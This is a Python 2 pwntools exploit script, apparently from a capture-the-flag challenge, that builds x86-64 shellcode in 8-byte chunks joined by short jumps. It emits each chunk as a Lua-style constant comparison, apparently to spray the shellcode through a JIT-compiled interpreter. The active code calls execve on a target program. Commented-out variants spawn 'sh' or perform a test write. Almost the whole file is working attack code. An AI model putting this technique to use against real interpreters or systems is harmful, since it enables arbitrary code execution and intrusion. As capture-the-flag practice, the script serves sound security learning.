#!/usr/bin/env python2
from pwn import *

context.binary = ELF('./cove_local',checksec=False)

# Exploit
shellcode = []

# execve("sh", 0, 0)
# shellcode.append(u64(asm("push 0; push 0x73; nop; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push 0x68; push rsp; pop rdi; nop; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push 59; pop rax; nop; nop; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("xor rsi, rsi; xor rdx, rdx; syscall").ljust(8,'\0')))

# write(1, "s", 1)
# shellcode.append(u64(asm("push 0; push 0x68; push rsp; pop rsi; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("xor rdi, rdi; inc rdi; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("xor rdx, rdx; inc rdx; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("xor rax, rax; inc rax; syscall").ljust(8,'\0')))

# execve("./dig_up_the_loot", ["x", "marks", "the", "spot"], 0)
# shellcode.append(u64(asm("push "+str(u32("oot\x00"))+"; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push "+str(u32("nd_l"))+"; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push "+str(u32("up_a"))+"; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push "+str(u32("dig_"))+"; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push "+str(u32("./".ljust(4,'\0')))+"; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push rsp; pop rdi; push 59; pop rax; nop; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("xor rsi, rsi; xor rdx, rdx; syscall").ljust(8,'\0')))

# shellcode.append(u64(asm("add ecx, 0x1b8; push rcx; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push rsp; pop rdi; add cx, 0x12; jmp $+4").ljust(8,'\0')))
# shellcode.append(u64(asm("push rcx; add cx, 2; jmp $+5").ljust(8,'\0')))
# shellcode.append(u64(asm("push rcx; add cx, 6; jmp $+5").ljust(8,'\0')))
# shellcode.append(u64(asm("push rcx; push 59; int3; pop rax; syscall").ljust(8,'\0')))

# shellcode.append(u64(asm("nop; nop; nop; nop; nop; int3; jmp $+4").ljust(8,'\0'))) # DEBUG

# shellcode.append(u64(asm("add cx, 0x60; push rcx; nop; jmp $+4").ljust(8,'\0'))) # PATH
# shellcode.append(u64(asm("pop rdi; add cx, 0x12; jmp $+5").ljust(8,'\0'))) # ARGV[0]
# shellcode.append(u64(asm("push rcx; add cx, 2; jmp $+5").ljust(8,'\0'))) # ARGV[1]
# shellcode.append(u64(asm("push rcx; add cx, 6; jmp $+5").ljust(8,'\0'))) # ARGV[2]
# shellcode.append(u64(asm("push rcx; add cx, 4; jmp $+5").ljust(8,'\0'))) # ARGV[3]
# shellcode.append(u64(asm("push rcx; push rsp; pop rsi; push 59; pop rax; syscall").ljust(8,'\0'))) # execve

shellcode.append(u64(asm("add cx, 0x60; push rcx; nop; jmp $+4").ljust(8,'\0'))) # PATH
shellcode.append(u64(asm("pop rdi; add cx, 0x12; jmp $+5").ljust(8,'\0'))) # ARGV[0]
shellcode.append(u64(asm("push 0; nop; nop; push rcx; jmp $+5").ljust(8,'\0'))) # ARGV[1]
shellcode.append(u64(asm("add cx, 5; push rcx; jmp $+5").ljust(8,'\0'))) # ARGV[1]
shellcode.append(u64(asm("add cx, 4; push rcx; jmp $+5").ljust(8,'\0'))) # ARGV[2]
shellcode.append(u64(asm("add cx, 6; push rcx; jmp $+5").ljust(8,'\0'))) # ARGV[3]
shellcode.append(u64(asm("push rdi; push rsp; pop rsi; push 59; pop rax; syscall").ljust(8,'\0'))) # execve

for i in shellcode:
    print('if i == ' + hex(i) + 'LL then print(i) end')